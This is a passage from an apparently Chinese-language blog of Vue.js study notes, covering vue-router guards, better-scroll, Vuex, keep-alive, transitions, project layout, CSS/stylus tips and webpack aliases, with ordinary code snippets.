即将要进入的目标 路由对象</li><li>from: Route: 当前导航正要离开的路由</li><li>next: Function: 一定要调用该方法来 resolve 这个钩子。</li></ul><h4 id="全局后置钩子"><a href="#全局后置钩子" class="headerlink" title="全局后置钩子"></a>全局后置钩子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.afterEach((to, from) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="路由独享的守卫"><a href="#路由独享的守卫" class="headerlink" title="路由独享的守卫"></a>路由独享的守卫</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/foo&apos;,</span><br><span class="line">      component: Foo,</span><br><span class="line">      beforeEnter: (to, from, next) =&gt; &#123;</span><br><span class="line">        // ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="组件内的守卫"><a href="#组件内的守卫" class="headerlink" title="组件内的守卫"></a>组件内的守卫</h4><ul><li>beforeRouteEnter</li><li>beforeRouteUpdate (2.2 新增)</li><li>beforeRouteLeave </li></ul><h4 id="完整的导航解析流程"><a href="#完整的导航解析流程" class="headerlink" title="完整的导航解析流程"></a>完整的导航解析流程</h4><ul><li>导航被触发。</li><li>在失活的组件里调用 beforeRouteLeave 离开守卫。</li><li>调用全局的 beforeEach 守卫。</li><li>在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。</li><li>在路由配置里调用 beforeEnter。</li><li>解析异步路由组件。</li><li>在被激活的组件里调用 beforeRouteEnter。</li><li>调用全局的 beforeResolve 守卫 (2.5+)。</li><li>导航被确认。</li><li>调用全局的 afterEach 钩子。</li><li>触发 DOM 更新。</li><li>用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。</li></ul><h3 id="滚动行为"><a href="#滚动行为" class="headerlink" title="滚动行为"></a>滚动行为</h3><p>使用前端路由，当切换到新路由时，想要页面滚到顶部，或者是保持原先的滚动位置，就像重新加载页面那样。 vue-router 能做到，而且更好，它让你可以自定义路由切换时页面如何滚动。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scrollBehavior (to, from, savedPosition) &#123;</span><br><span class="line">  if (savedPosition) &#123;</span><br><span class="line">    return savedPosition</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return &#123; x: 0, y: 0 &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="better-scroll-依赖包"><a href="#better-scroll-依赖包" class="headerlink" title="better-scroll 依赖包"></a>better-scroll 依赖包</h2><h3 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install better-scroll --save</span><br><span class="line"></span><br><span class="line">import BScroll from &apos;better-scroll&apos;</span><br><span class="line">mounted () &#123;</span><br><span class="line">  this.scroll = new Bscroll(this.$refs.wrapper, &#123; mouseWheel: true, click: true, tap: true &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>startX: 0 (默认值:0) 表示X轴滚动的起始值</li><li>startY: 0 (默认值:0) 表示Y轴滚动的起始值</li><li>scrollY: false (默认值:false) 表示延Y轴滚动</li><li>scrollX: true (默认值:true) 表示延X轴滚动</li><li>freeScroll: false (默认值:false) 自由方向滚动</li><li>scrollbar: false (默认值:false) 滚动条</li><li>click: false (默认值:false) better-scroll 默认会阻止浏览器的原生 click 事件。当设置为 true，better-scroll 会派发一个 click 事件</li><li>tap: false (默认值:false) better-scroll 会阻止原生的 click 事件，我们可以设置 tap 为 true，它会在区域被点击的时候派发一个 tap 事件</li><li>mouseWheel: false (默认值:false) 这个配置用于 PC 端的鼠标滚轮，默认为 false 。当设置为 true 或者是一个 Object 的时候，可以开启鼠标滚轮</li></ul><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><h4 id="refresh"><a href="#refresh" class="headerlink" title="refresh()"></a>refresh()</h4><p>重新计算 better-scroll，当 DOM 结构发生变化的时候务必要调用确保滚动的效果正常</p><h4 id="scrollTo-x-y-time-easing"><a href="#scrollTo-x-y-time-easing" class="headerlink" title="scrollTo(x, y, time, easing)"></a>scrollTo(x, y, time, easing)</h4><p>滚动到指定的位置;</p><ul><li>x: X轴位置;</li><li>y: Y轴位置;</li><li>time: 到达指定位置所需时间，单位ms; </li><li>easing: 动画函数(一般不建议修改)</li></ul><h4 id="scrollBy-x-y-time-easing"><a href="#scrollBy-x-y-time-easing" class="headerlink" title="scrollBy(x, y, time, easing)"></a>scrollBy(x, y, time, easing)</h4><p>相对于当前位置偏移滚动 x,y 的距离；</p><ul><li>x: 当前位置偏移X轴的距离</li><li>y: 当前位置偏移Y轴的距离</li><li>time: 到达偏移位置所需时间，单位ms; </li><li>easing: 动画函数(一般不建议修改)</li></ul><h4 id="scrollToElement-el-time-offsetX-offsetY-easing"><a href="#scrollToElement-el-time-offsetX-offsetY-easing" class="headerlink" title="scrollToElement(el, time, offsetX, offsetY, easing)"></a>scrollToElement(el, time, offsetX, offsetY, easing)</h4><p>滚动到指定的目标元素</p><ul><li>el: 目标元素;</li><li>time: 到达目标元素所需时间，单位ms; </li><li>offsetX: 距离目标元素所偏移X轴的距离;设置为true时，到达目标元素中心位置</li><li>offsetY: 距离目标元素所偏移Y轴的距离;设置为true时，到达目标元素中心位置</li><li>easing: 动画函数(一般不建议修改)</li></ul><h2 id="vuex-实现数据共享"><a href="#vuex-实现数据共享" class="headerlink" title="vuex 实现数据共享"></a>vuex 实现数据共享</h2><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install vuex --save</span><br><span class="line"></span><br><span class="line">//main.js</span><br><span class="line">import Vuex from &apos;vuex&apos;</span><br><span class="line">Vue.use(Vuex)</span><br></pre></td></tr></table></figure><h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。<br>Vuex 解决了以下问题：</p><ul><li>多个视图依赖于同一状态。</li><li>来自不同视图的行为需要变更同一状态。</li></ul><p>下图为 vuex 工作流程:</p><p><img src="../assets/20190916/vuex.png" alt="Alt text"></p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><h4 id="State"><a href="#State" class="headerlink" title="State"></a>State</h4><p>由于 Vuex 的状态存储是响应式的，从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态。每当 <code>this.$store.state.count</code> 变化的时候, 都会重新求取计算属性，并且触发更新相关联的 DOM。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const Counter = &#123;</span><br><span class="line">  template: `&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    count () &#123;</span><br><span class="line">      return this.$store.state.count</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以使用 <code>mapState</code> 辅助函数帮助我们生成计算属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapState &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">computed: &#123;</span><br><span class="line">  ...mapState([&apos;city&apos;])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h4><p>Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; id: 1, text: &apos;...&apos;, done: true &#125;,</span><br><span class="line">      &#123; id: 2, text: &apos;...&apos;, done: false &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">    doneTodos: state =&gt; &#123;</span><br><span class="line">      return state.todos.filter(todo =&gt; todo.done)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.getters.doneTodos </span><br><span class="line">// -&gt; [&#123; id: 1, text: &apos;...&apos;, done: true &#125;]</span><br></pre></td></tr></table></figure></p><p><code>mapGetters</code> 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapGetters &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapGetters([</span><br><span class="line">      &apos;doneTodosCount&apos;,</span><br><span class="line">      &apos;anotherGetter&apos;,</span><br><span class="line">    ])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Mutation"><a href="#Mutation" class="headerlink" title="Mutation"></a>Mutation</h4><p>更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 <code>事件类型</code> (type) 和 一个 <code>回调函数</code> (handler)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">  increment (state, payload) &#123;</span><br><span class="line">    state.count += payload.amount</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.commit(&apos;increment&apos;, &#123;</span><br><span class="line">  amount: 10</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>你可以在组件中使用 this.$store.commit(‘xxx’) 提交 mutation，或者使用 <code>mapMutations</code> 辅助函数将组件中的 methods 映射为 store.commit 调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapMutations &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  // ...</span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapMutations([</span><br><span class="line">      &apos;increment&apos;, </span><br><span class="line">      // 将 `this.increment()` 映射为 `this.$store.commit(&apos;increment&apos;)`</span><br><span class="line">    ])</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h4 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h4><p>Action 类似于 mutation，不同在于：</p><ul><li>Action 提交的是 mutation，而不是直接变更状态。</li><li>Action 可以包含任意异步操作。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    increment (context) &#123;</span><br><span class="line">      context.commit(&apos;increment&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.dispatch(&apos;increment&apos;)</span><br></pre></td></tr></table></figure><p>我们可以在 action 内部执行异步操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  actionA (&#123; commit &#125;) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      setTimeout(() =&gt; &#123;</span><br><span class="line">        commit(&apos;someMutation&apos;)</span><br><span class="line">        resolve()</span><br><span class="line">      &#125;, 1000)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.dispatch(&apos;actionA&apos;).then(() =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h4><p>Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const moduleA = &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;,</span><br><span class="line">  getters: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const moduleB = &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA,</span><br><span class="line">    b: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.state.a // -&gt; moduleA 的状态</span><br><span class="line">store.state.b // -&gt; moduleB 的状态</span><br></pre></td></tr></table></figure></p><h2 id="LocalStorage-使用"><a href="#LocalStorage-使用" class="headerlink" title="LocalStorage 使用"></a>LocalStorage 使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let defaultCity = &apos;杭州&apos;</span><br><span class="line">try &#123;</span><br><span class="line">  if (localStorage.city) &#123;</span><br><span class="line">    defaultCity = localStorage.city</span><br><span class="line">  &#125;</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="Keep-alive"><a href="#Keep-alive" class="headerlink" title="Keep-alive"></a>Keep-alive</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>keep-alive 是 Vue 内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;</span><br><span class="line">    &lt;!-- 该组件将被缓存！ --&gt;</span><br><span class="line">  &lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>include - 字符串或正则表达，只有匹配的组件会被缓存</li><li>exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存</li></ul><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  name: &apos;a&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;keep-alive exclude=&quot;a&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;</span><br><span class="line">    &lt;!-- 除了 name 为 a 的组件都将被缓存！ --&gt;</span><br><span class="line">  &lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;可以保留它的状态或避免重新渲染</span><br></pre></td></tr></table></figure><h3 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h3><p>当组件中 <code>&lt;router-view&gt;</code> 内被切换，它的 <code>activatied</code> 和<code>deactivated</code> 这两个生命周期钩子函数将会被执行，同时，被缓存的页面， <code>mounted</code> 钩子将只在第一次请求时被执行。</p><ul><li>activated：keep-alive 组件激活时调用。</li><li>deactivated：keep-alive 组件停用时调用。</li></ul><h2 id="递归组件的使用"><a href="#递归组件的使用" class="headerlink" title="递归组件的使用"></a>递归组件的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot; v-for=&quot;(item, index) of list&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;item-title border-bottom&quot;&gt;</span><br><span class="line">      &lt;span class=&quot;item-title-icon&quot;&gt;&lt;/span&gt;</span><br><span class="line">      &#123;&#123;item.title&#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div v-if=&quot;item.children&quot; class=&quot;item-children&quot;&gt;</span><br><span class="line">      &lt;detail-list :list=&quot;item.children&quot;&gt;&lt;/detail-list&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="添加动画效果"><a href="#添加动画效果" class="headerlink" title="添加动画效果"></a>添加动画效果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;transition&gt;</span><br><span class="line">    &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">  &lt;/transition&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;Fade&apos;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;stylus&quot; scoped&gt;</span><br><span class="line">.v-enter, .v-leave-to</span><br><span class="line">  opacity: 0</span><br><span class="line">.v-enter-active, .v-leave-active</span><br><span class="line">  transition: opacity .5s</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="项目打包上线"><a href="#项目打包上线" class="headerlink" title="项目打包上线"></a>项目打包上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p><code>dist</code> 目录为打包好的文件。</p><h2 id="项目目录解读"><a href="#项目目录解读" class="headerlink" title="项目目录解读"></a>项目目录解读</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">├── index.html</span><br><span class="line">├── main.js</span><br><span class="line">├── static</span><br><span class="line">│   └── mock             # 模拟JSON数据</span><br><span class="line">├── assets               # 静态资源</span><br><span class="line">│   ├── style </span><br><span class="line">│   └── pic </span><br><span class="line">├── common               # 共用全局组件</span><br><span class="line">│   ├── fade </span><br><span class="line">│   └── gallary</span><br><span class="line">├── pages                # 每个页面划分成一个组件</span><br><span class="line">│   ├── city             # 页面内部再划分小组件</span><br><span class="line">│   │   ├── component</span><br><span class="line">│   │   └── City.vue</span><br><span class="line">│   ├── detail  </span><br><span class="line">│   │   ├── component</span><br><span class="line">│   │   └── Detail.vue</span><br><span class="line">│   └── home</span><br><span class="line">│       ├── component</span><br><span class="line">│       └── Home.vue</span><br><span class="line">├── router   </span><br><span class="line">│   └── index.js          # 路由配置</span><br><span class="line">└── store</span><br><span class="line">    ├── index.js          # 组装模块并导出 store 的地方</span><br><span class="line">    ├── actions.js        # 根级别的 action</span><br><span class="line">    ├── mutations.js      # 根级别的 mutation</span><br><span class="line">    └── modules</span><br><span class="line">        ├── cart.js       </span><br><span class="line">        └── products.js</span><br></pre></td></tr></table></figure><h2 id="CSS技巧"><a href="#CSS技巧" class="headerlink" title="CSS技巧"></a>CSS技巧</h2><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//单个元素</span><br><span class="line">line-height == height</span><br><span class="line"></span><br><span class="line">//父元素内子元素居中</span><br><span class="line">display: flex</span><br><span class="line">flex-direction: column</span><br><span class="line">justify-content: center</span><br></pre></td></tr></table></figure><h3 id="响应式大小"><a href="#响应式大小" class="headerlink" title="响应式大小"></a>响应式大小</h3><p>在静态CSS文件中设置 <code>font-size</code> 对应的像素值，使用 <code>rem</code> 动态获得实际像素。</p><h3 id="元素间距"><a href="#元素间距" class="headerlink" title="元素间距"></a>元素间距</h3><p><code>inline-block</code> 显示的元素之间，会存在2px的间距，为了取消这个间距，可以设置父元素的 <code>font-size</code> 为 0 。</p><h3 id="stylus变量"><a href="#stylus变量" class="headerlink" title="stylus变量"></a>stylus变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// assets/styles -&gt; varibles.styl</span><br><span class="line">$bgColor = #00bcd4</span><br><span class="line">$darkTextColor = #333</span><br><span class="line">$headerHeight = .86rem</span><br><span class="line"></span><br><span class="line">//xxx.vue</span><br><span class="line">@import &apos;~styles/varibles&apos;</span><br><span class="line"></span><br><span class="line">line-height: $headerHeight</span><br><span class="line">background: $bgColor</span><br></pre></td></tr></table></figure><h3 id="stylus混合"><a href="#stylus混合" class="headerlink" title="stylus混合"></a>stylus混合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// assets/styles -&gt; mixins.styl</span><br><span class="line">ellipsis()</span><br><span class="line">  overflow: hidden</span><br><span class="line">  white-space: nowrap</span><br><span class="line">  text-overflow: ellipsis</span><br><span class="line"></span><br><span class="line">//xxx.vue</span><br><span class="line">@import &apos;@~styles/mixins.styl&apos;;</span><br><span class="line"></span><br><span class="line">.item-title</span><br><span class="line">  line-height: .54rem</span><br><span class="line">  font-size: .32rem</span><br><span class="line">  ellipsis()</span><br></pre></td></tr></table></figure><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><h3 id="路径别名"><a href="#路径别名" class="headerlink" title="路径别名"></a>路径别名</h3><p>有时候路径名过长，在引入的过程较为不便，所以我们可以通过更改配置项，为路径添加别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//build -&gt; webpack.base.config.js</span><br><span class="line">resolve: &#123;</span><br><span class="line">  extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;],</span><br><span class="line">  alias: &#123;</span><br><span class="line">    &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;,</span><br><span class="line">    &apos;@&apos;: resolve(&apos;src&apos;),</span><br><span class="line">    &apos;styles&apos;: resolve(&apos;src/assets/styles&apos;),</span><br><span class="line">    